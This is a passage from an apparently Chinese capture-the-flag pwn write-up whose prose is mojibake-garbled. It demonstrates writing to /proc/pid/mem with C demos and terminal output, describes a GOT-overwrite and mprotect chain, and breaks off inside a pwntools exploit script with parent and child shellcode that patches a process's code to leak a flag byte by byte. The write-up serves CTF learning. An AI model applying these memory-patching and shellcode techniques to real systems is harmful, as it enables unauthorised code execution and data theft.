<h4 id="0x4-2-proc-pid-selfä¼ªæ–‡ä»¶åˆ©ç”¨"><a href="#0x4-2-proc-pid-selfä¼ªæ–‡ä»¶åˆ©ç”¨" class="headerlink" title="0x4.2 /proc/pid/selfä¼ªæ–‡ä»¶åˆ©ç”¨"></a>0x4.2 /proc/pid/selfä¼ªæ–‡ä»¶åˆ©ç”¨</h4><p>è¿™é“é¢˜åˆ©ç”¨çš„æ˜¯<code>/proc/pid/mem</code>ä¼ªæ–‡ä»¶ï¼Œç½‘ä¸Šæ²¡æœ‰æ‰¾è§è¿™ä¸ªä¼ªæ–‡ä»¶çš„å…·ä½“å®šä¹‰ï¼ŒæŒ‰æˆ‘çš„ç†è§£å°±æ˜¯è¿™ä¸ªè¿›ç¨‹çš„ä¼ªæ–‡ä»¶ï¼Œæ‰“å¼€çš„è¿™ä¸ªæ–‡ä»¶å°±æ˜¯è¿™ä¸ªè¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´çš„å†…å®¹ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªä¼ªæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦å¯¹è¿™ä¸ªæ–‡ä»¶è¿›è¡Œæ“ä½œï¼Œä¹Ÿå°±æ˜¯å¯¹è¿™ä¸ªè¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´è¿›è¡Œæ“ä½œï¼Œæ¯”å¦‚<code>read</code>æ“ä½œå’Œ<code>write</code>æ“ä½œï¼Œä½†æ˜¯æ³¨æ„çš„æ˜¯readå’Œwirteæ“ä½œçš„è™šæ‹Ÿåœ°å€å¿…é¡»æ˜¯æ˜ å°„åˆ°å†…å­˜ä¸­çš„ï¼Œä¸ç„¶ä¼šå‘ç”Ÿioé”™è¯¯ï¼ŒåŸå› ä¹Ÿå¾ˆå¥½æƒ³ï¼Œæ²¡æœ‰çœŸå®å†…å­˜æ˜ å°„ä½ æ€ä¹ˆè¯»æ€ä¹ˆå†™ï¼Œè¿™æ˜¯æˆ‘å†™çš„ä¸€ä¸ªå°demoæ¥å®Œæˆå½“å‰è¿›ç¨‹çš„è¯»å–</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="built_in">sprintf</span>(buf,<span class="string">&quot;/proc/%d/mem&quot;</span>,getpid());</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line">	<span class="keyword">int</span> fd=open(buf,<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,fd);</span><br><span class="line">	<span class="keyword">char</span> buff[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> fd1=open(<span class="string">&quot;/proc/self/maps&quot;</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">char</span> buff1[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	read(fd1,buff1,<span class="number">900</span>);</span><br><span class="line">	write(<span class="number">1</span>,buff1,<span class="number">900</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="keyword">size_t</span> offset=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;offset);</span><br><span class="line">	lseek(fd,offset,<span class="number">1</span>);</span><br><span class="line">	read(fd,buff,<span class="number">900</span>);</span><br><span class="line">	write(<span class="number">1</span>,buff,<span class="number">900</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¯»å–ä»£ç æ®µçš„æ•ˆæœï¼Œæ­¤ç¨‹åºä»£ç æ®µç›¸å¯¹äºç¨‹åºé¦–åœ°å€åç§»0x850</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@ubuntu:~/get-shell/tscrf/pwn5$ ./pwnc</span><br><span class="line">/proc/5819/mem</span><br><span class="line">3</span><br><span class="line">561fcc31a000-561fcc31b000 r-xp 00000000 08:01 542793                     /home/rootzhang/get-shell/tscrf/pwn5/pwnc</span><br><span class="line">561fcc51a000-561fcc51b000 r--p 00000000 08:01 542793                     /home/rootzhang/get-shell/tscrf/pwn5/pwnc</span><br><span class="line">561fcc51b000-561fcc51c000 rw-p 00001000 08:01 542793                     /home/rootzhang/get-shell/tscrf/pwn5/pwnc</span><br><span class="line">561fcd474000-561fcd495000 rw-p 00000000 00:00 0                          [heap]</span><br><span class="line">7fc4ceee2000-7fc4cf0c9000 r-xp 00000000 08:01 1192603                    /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7fc4cf0c9000-7fc4cf2c9000 ---p 001e7000 08:01 1192603                    /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7fc4cf2c9000-7fc4cf2cd000 r--p 001e7000 08:01 1192603                    /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7fc4cf2cd000-7fc4cf2cf000 rw-p 001eb000 08:01 1192603                    /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7fc4cf2cf000-7fc4cf2d3000 rw-p 00000000 00:</span><br><span class="line">94694569781328</span><br><span class="line">]ï¿½ï¿½f.ï¿½]ï¿½@f.ï¿½Hï¿½=I Hï¿½5B UH)ï¿½Hï¿½ï¿½Hï¿½ï¿½Hï¿½ï¿½Hï¿½ï¿½?Hï¿½Hï¿½ï¿½tHï¿½ Hï¿½ï¿½t</span><br><span class="line">                                                           ]ï¿½ï¿½fï¿½]ï¿½@f.ï¿½ï¿½=ï¿½ u/Hï¿½=ï¿½ UHï¿½ï¿½t</span><br><span class="line">ï¿½ï¿½ï¿½ï¿½Hï¿½ï¿½ï¿½ï¿½ï¿½ ]ï¿½ï¿½ï¿½ï¿½fDUHï¿½ï¿½]ï¿½fï¿½ï¿½ï¿½UHï¿½ï¿½Hï¿½ï¿½dHï¿½%(Hï¿½Eï¿½1ï¿½Hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½</span><br><span class="line">                                                            Hï¿½ï¿½ï¿½Hï¿½Hï¿½ï¿½ï¿½Hï¿½ï¿½ï¿½&#x27;ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½5ï¿½Hï¿½Ç¸ï¿½zï¿½ï¿½ï¿½Hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½Ç¸ï¿½2ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½=ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½&#125;Hï¿½ï¿½ï¿½Hï¿½ï¿½Hï¿½=ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½&#125;Hï¿½ï¿½ï¿½Hï¿½Hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½Î‰ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½Æ¿ï¿½4ï¿½ï¿½ï¿½ï¿½</span><br><span class="line">ï¿½</span><br><span class="line">ï¿½ï¿½ï¿½HÇ…ï¿½ï¿½ï¿½ï¿½Hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½ï¿½Hï¿½=#ï¿½ï¿½tï¿½ï¿½ï¿½Hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½Î‰ï¿½ï¿½%ï¿½ï¿½ï¿½Hï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½Î‰ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½Æ¿ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½uï¿½dH34%(tï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½DAWAVIï¿½ï¿½AUATLï¿½%6 UHï¿½-6 SAï¿½ï¿½Iï¿½ï¿½L)ï¿½Hï¿½Hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½ï¿½t 1ï¿½ï¿½Lï¿½ï¿½Lï¿½ï¿½Dï¿½ï¿½Aï¿½ï¿½Hï¿½ï¿½H9ï¿½uï¿½Hï¿½[]A\A]A^A_Ãf.ï¿½ï¿½ï¿½Hï¿½Hï¿½ï¿½/proc/%d/mem%d</span><br><span class="line"><span class="meta">/proc/self/maps%</span><span class="bash">lld;8rootzhang@ubuntu:~/get-shell/tscrf/pwn5$</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç¨‹åºä¿®æ”¹ä»£ç æ®µå¯¼è‡´ç¨‹åºå¼‚å¸¸</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> s=<span class="number">4</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	s=<span class="number">5</span>;</span><br><span class="line">	<span class="built_in">sprintf</span>(buf,<span class="string">&quot;/proc/%d/mem&quot;</span>,getpid());</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line">	<span class="keyword">int</span> fd=open(buf,O_RDWR);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,fd);</span><br><span class="line">	<span class="keyword">char</span> buff[<span class="number">0x1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> fd1=open(<span class="string">&quot;/proc/self/maps&quot;</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">char</span> buff1[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	read(fd1,buff1,<span class="number">900</span>);</span><br><span class="line">	write(<span class="number">1</span>,buff1,<span class="number">900</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="keyword">size_t</span> offset=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;offset);</span><br><span class="line">	lseek(fd,offset,<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x1000</span>;i++)&#123;</span><br><span class="line">		buff[i]=<span class="number">0xcc</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> ret=write(fd,buff,<span class="number">0x1</span>);</span><br><span class="line">	<span class="keyword">if</span>(ret==<span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;write fail\n&quot;</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,strerror(errno));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;hock is not ok\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ•ˆæœ</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@ubuntu:~/get-shell/tscrf/pwn5$ ./pwnc</span><br><span class="line">/proc/6461/mem</span><br><span class="line">3</span><br><span class="line">555edf693000-555edf694000 r-xp 00000000 08:01 542793                     /home/rootzhang/get-shell/tscrf/pwn5/pwnc</span><br><span class="line">555edf894000-555edf895000 r--p 00001000 08:01 542793                     /home/rootzhang/get-shell/tscrf/pwn5/pwnc</span><br><span class="line">555edf895000-555edf896000 rw-p 00002000 08:01 542793                     /home/rootzhang/get-shell/tscrf/pwn5/pwnc</span><br><span class="line">555ee0f03000-555ee0f24000 rw-p 00000000 00:00 0                          [heap]</span><br><span class="line">7fcea4c50000-7fcea4e37000 r-xp 00000000 08:01 1192603                    /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7fcea4e37000-7fcea5037000 ---p 001e7000 08:01 1192603                    /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7fcea5037000-7fcea503b000 r--p 001e7000 08:01 1192603                    /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7fcea503b000-7fcea503d000 rw-p 001eb000 08:01 1192603                    /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7fcea503d000-7fcea5041000 rw-p 00000000 00:</span><br><span class="line">93865963502584</span><br><span class="line">è¿½è¸ªä¸ä¸­æ–­ç‚¹é™·é˜± (æ ¸å¿ƒå·²è½¬å‚¨)</span><br></pre></td></tr></table></figure>

<p>å¯è§è¿™ä¸ªä¼ªæ–‡ä»¶è¿˜æ˜¯éå¸¸nbçš„ï¼Œå¦‚æœèƒ½å¯¹è¿™ä¸ªä¼ªæ–‡ä»¶è¿›è¡Œwriteçš„è¯ï¼Œå°±å¯ä»¥å¿½è§†è¿™ä¸ªè¿›è¡Œçš„å„ä¸ªæ®µçš„æƒé™è¿›è¡Œä»»æ„ç¯¡æ”¹ã€‚</p>
<p>0x4.3 è§£é¢˜æ€è·¯</p>
<p>1.é¦–å…ˆæ˜¯èƒ½å¤Ÿæ‰§è¡Œä»»æ„åº“å‡½æ•°ï¼Œä½¿ç”¨äº†æˆ‘ä»æœªè§è¿‡çš„gadget</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add [rbp-0x3d],ebx</span><br><span class="line">nop</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>åªè¦æ§åˆ¶äº†rbpå’Œebxå°±å¯ä»¥ä¿®æ”¹ä»»æ„æ•°æ®äº†äº†ï¼Œè¿™é‡Œä¿®æ”¹gotè¡¨çš„åœ°å€ä¸ºsyscallï¼Œç„¶åä½¿ç”¨pltè·³åˆ°è¿™ä¸ªgotè¡¨é¡¹å°±å¯ä»¥äº†ã€‚</p>
<p>2.æŠŠgetpidçš„gotæ”¹æˆmprotectï¼Œç„¶åè°ƒç”¨mprotectä½¿å¾—bssæ®µrwx,ç„¶åè·³åˆ°bssæ®µ</p>
<p>3.çˆ¶è¿›ç¨‹è°ƒç”¨è°ƒç”¨open(â€˜/proc/pid/memâ€™,2,0)å…¶ä¸­2ä»£è¡¨æ˜¯å¯å†™æƒé™ï¼Œç„¶åè°ƒç”¨lseek(fd,offset,0)æŠŠæ–‡ä»¶è¯»å†™æŒ‡é’ˆæŒ‡å¯¼sleepåé¢çš„ä¸€ä¸ªåœ°å€ï¼Œç„¶åwrite(fd,text,count),æ”¹å†™sleep()åé¢çš„ä»£ç ï¼Œç„¶åä½¿ç”¨wait(-1,addr,0)ç­‰å¾…è¿™ä¸ªå­è¿›ç¨‹ç»“æŸï¼Œè¿™ä¸ªå­è¿›ç¨‹çš„è¿”å›å€¼å°±æ˜¯ä¸€ä¸ªflagçš„å­—ç¬¦ï¼Œå‚¨å­˜åœ¨addr+1çš„ä½ç½®ï¼Œæœ€åä½¿ç”¨writeè¾“å‡º</p>
<p>å…¶ä¸­æœ‰å‡ ä¸ªå‡½æ•°æ¯”è¾ƒé™Œç”Ÿ</p>
<p><strong>lseek(int fd, off_t offset, int whence)</strong>:å¯ä»¥è®¾ç½®fdçš„å½“å‰è¯»å†™æŒ‡é’ˆï¼Œå…¶ä¸­whenceå‚æ•°æœ‰ä¸‰ä¸ª</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SEEK_SET:0#ä»æ–‡ä»¶å¤´éƒ¨å¼€å§‹åç§»offsetä¸ªå­—èŠ‚</span><br><span class="line">SEEK_CUR:1#ä»æ–‡ä»¶å½“å‰è¯»å†™çš„æŒ‡é’ˆä½ç½®å¼€å§‹ï¼Œå¢åŠ offsetä¸ªå­—èŠ‚çš„åç§»é‡</span><br><span class="line">SEEK_END:2#æ–‡ä»¶åç§»é‡è®¾ç½®ä¸ºæ–‡ä»¶çš„å¤§å°åŠ ä¸Šåç§»é‡å­—èŠ‚</span><br></pre></td></tr></table></figure>

<p>**wait4 ( pid_t <em>pid</em>, int <strong>status*, int <em>option</em>, struct rusage *<em>ru</em> )</strong>,é˜»å¡ç­‰å¾…æŒ‡å®šçš„å­è¿›ç¨‹ï¼Œç„¶åæŠŠè¿›ç¨‹ä¿¡æ¯æ”¾åœ¨ç¬¬äºŒä¸ªå‚æ•°çš„åœ°æ–¹ï¼Œå¦‚æœpid=-1,åˆ™æ˜¯ç­‰å¾…æ‰€æœ‰å­è¿›ç¨‹</p>
<p>4.å­è¿›ç¨‹è°ƒç”¨open(â€œ./flagâ€,0),ç„¶åè°ƒç”¨lseek(fd,offset,0)å®šä½è¯»å†™æŒ‡é’ˆï¼Œç„¶åè°ƒç”¨read(fd,addr,1)è¯»å…¥ä¸€ä¸ªflag,æœ€åexit(*addr)æŠŠè¿™ä¸ªå­—ç¬¦é€šè¿‡exitè¿”å›ï¼Œè¿™æ ·çˆ¶è¿›ç¨‹å°±å¯ä»¥é€šè¿‡wait()å‡½æ•°è·å¾—å…¶è¿”å›å€¼äº†ã€‚</p>
<h4 id="0x4-3-è„šæœ¬"><a href="#0x4-3-è„šæœ¬" class="headerlink" title="0x4.3 è„šæœ¬"></a>0x4.3 è„šæœ¬</h4><p>é‡ç‚¹å‚è€ƒäº†å®˜æ–¹wpå’Œayoungä½¬çš„è„šæœ¬ï¼Œä¸è¿‡ç°åœ¨å¥½åƒä¹Ÿå°±è¿™ä¸¤ä¸ªwp,ç¬¬ä¸€æ¬¡å†™è¿™ä¹ˆå¤šçš„æ±‡ç¼–ï¼Œè€Œä¸”è¿˜æ˜¯å¤šè¿›ç¨‹çš„ï¼Œå†™çš„æ—¶å€™èƒ†æˆ˜å¿ƒæƒŠç”Ÿæ€•å†™é”™,æœ€ååœ¨writeé‚£é‡Œå°‘èµ‹å€¼äº†raxè€½è¯¯äº†ä¸€ä¼šï¼Œä¸è¿‡å¹¸å¥½é—®é¢˜ä¸å¤§ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">pop_rdi=<span class="number">0x0000000000401573</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x0000000000401571</span></span><br><span class="line">duan=<span class="string">&#x27;b *(&#123;0&#125;)&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x401505</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,duan)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">offset</span>):</span></span><br><span class="line">    sh=process([<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ld-2.31.so&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;</span>&#125;)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line">    <span class="comment"># sh=process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">    elf=ELF(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Mute&#x27;s pid is &quot;</span>)</span><br><span class="line">    father_pid=<span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    parent_shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /*open(&quot;/proc/pid/mem&quot;,2,0)*/</span></span><br><span class="line"><span class="string">    mov rdi, 0x4047e0</span></span><br><span class="line"><span class="string">    mov rsi,2</span></span><br><span class="line"><span class="string">    mov rdx, 0</span></span><br><span class="line"><span class="string">    mov rax, 2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    /*lseek(3,offset,0)*/</span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    mov rsi, 0x4013B8</span></span><br><span class="line"><span class="string">    mov rdx, 0</span></span><br><span class="line"><span class="string">    mov rax, 8</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    /*write(fd,0x4042E0+0x300,0x70)*/</span></span><br><span class="line"><span class="string">    mov rsi, 0x4045e0</span></span><br><span class="line"><span class="string">    mov rdx,0x70</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    /*wait4(-1,0x4042E0+0x800,0,0)*/</span></span><br><span class="line"><span class="string">    mov rdi, 0xffffffffffffffff</span></span><br><span class="line"><span class="string">    mov rsi, 0x404ae0</span></span><br><span class="line"><span class="string">    mov rdx, 0</span></span><br><span class="line"><span class="string">    mov rcx, 0</span></span><br><span class="line"><span class="string">    mov rax, 61</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    /*write(1,0x4042E0+0x801,0x1)*/</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rsi,0x404ae1</span></span><br><span class="line"><span class="string">    mov rdx, 1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    child_shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /*open(&#x27;./flag&#x27;,0,0)*/</span></span><br><span class="line"><span class="string">    mov rax, 0x67616c662f2e</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    mov rsi, 0</span></span><br><span class="line"><span class="string">    mov rdx, 0</span></span><br><span class="line"><span class="string">    mov rax, 2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    /*lseek(fd,offset,0)*/</span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    mov rsi, &#123;0&#125;</span></span><br><span class="line"><span class="string">    mov rdx, 0</span></span><br><span class="line"><span class="string">    mov rax, 8</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    /*read(fd,0x4042E0,1)*/</span></span><br><span class="line"><span class="string">    mov rsi, 0x4042E0</span></span><br><span class="line"><span class="string">    mov rdx, 1</span></span><br><span class="line"><span class="string">    mov rax, 0</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    